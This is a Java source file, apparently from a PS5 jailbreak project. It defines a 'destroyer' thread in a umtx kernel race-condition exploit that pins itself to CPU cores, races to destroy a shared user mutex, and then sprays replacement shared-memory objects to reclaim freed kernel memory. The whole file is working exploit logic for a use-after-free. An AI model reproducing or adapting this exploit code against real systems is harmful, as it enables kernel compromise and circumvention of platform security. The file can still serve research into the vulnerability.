package org.ps5jb.client.payloads.umtx.impl1;

import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.include.machine.Param;
import org.ps5jb.sdk.include.sys.errno.NotFoundException;
import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.sdk.include.UniStd;
import org.ps5jb.sdk.include.sys.Umtx;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.include.sys.CpuSet;

public class DestroyerJob extends CommonJob
{
    private final State state;
    private final int index;
    
    public DestroyerJob(final int index, final State state) {
        this.state = state;
        this.index = index;
        this.jobName = "destroyer#" + index;
    }
    
    @Override
    protected void prepare() throws SdkException {
        super.prepare();
        final CpuSet cpuSet = new CpuSet(this.libKernel);
        cpuSet.setCurrentThreadAffinity(this.state.DESTROYER_THREAD_CORES[this.index]);
    }
    
    @Override
    protected void work() {
        final Umtx umtx = new Umtx(this.libKernel);
        final UniStd uniStd = new UniStd(this.libKernel);
        while (!this.state.raceDoneFlag.get()) {
            DebugStatus.debug("Starting loop");
            DebugStatus.debug("Waiting for ready flag");
            while (!this.state.readyFlag.get()) {
                this.thread_yield();
            }
            this.state.numReadyThreads.incrementAndGet();
            DebugStatus.debug("Waiting for destroy flag");
            while (!this.state.destroyFlag.get()) {
                this.thread_yield();
            }
            try {
                umtx.userMutexDestroy(this.state.primarySharedMemoryKeyAddress);
                this.state.numDestructions.incrementAndGet();
            }
            catch (final NotFoundException ex) {}
            catch (final SdkException e) {
                DebugStatus.error("Performing destroy operation failed", (Throwable)e);
            }
            this.state.numCompletedThreads.incrementAndGet();
            DebugStatus.debug("Waiting for spray flag");
            while (!this.state.sprayFlag.get()) {
                this.thread_yield();
            }
            if (this.state.numDestructions.get() >= 2) {
                DebugStatus.notice("Spraying and praying");
                for (int i = this.index; i < this.state.reclaimDescriptors.length; i += 2) {
                    try {
                        final Pointer secShm = this.state.secondarySharedMemoryKeyAddress.inc(8L * i);
                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("Creating secondary user mutex #" + i);
                        }
                        final int descriptor = umtx.userMutexCreate(secShm);
                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("Descriptor of secondary shared memory object #" + i + ": " + descriptor);
                        }
                        this.state.reclaimDescriptors[i] = descriptor;
                        if (DebugStatus.isDebugEnabled()) {
                            DebugStatus.debug("Truncating secondary shared memory object #" + i);
                        }
                        uniStd.ftruncate(descriptor, Param.ptoa(descriptor));
                        DebugStatus.debug("Destroying secondary user mutex #" + i);
                        umtx.userMutexDestroy(secShm);
                    }
                    catch (final SdkException e2) {
                        DebugStatus.error("Spray failed at iteration " + i, (Throwable)e2);
                    }
                }
                DebugStatus.notice("Spraying done");
            }
            this.state.numSprays.incrementAndGet();
            DebugStatus.debug("Waiting for check done flag");
            while (!this.state.checkDoneFlag.get()) {
                this.thread_yield();
            }
            this.state.numReadyThreads.incrementAndGet();
            DebugStatus.debug("Waiting for done flag");
            while (!this.state.doneFlag.get()) {
                this.thread_yield();
            }
            this.state.numFinishedThreads.incrementAndGet();
        }
        DebugStatus.debug("Waiting for destroy flag");
        while (!this.state.destroyFlag.get()) {
            this.thread_yield();
        }
        DebugStatus.debug("Finishing loop");
    }
}
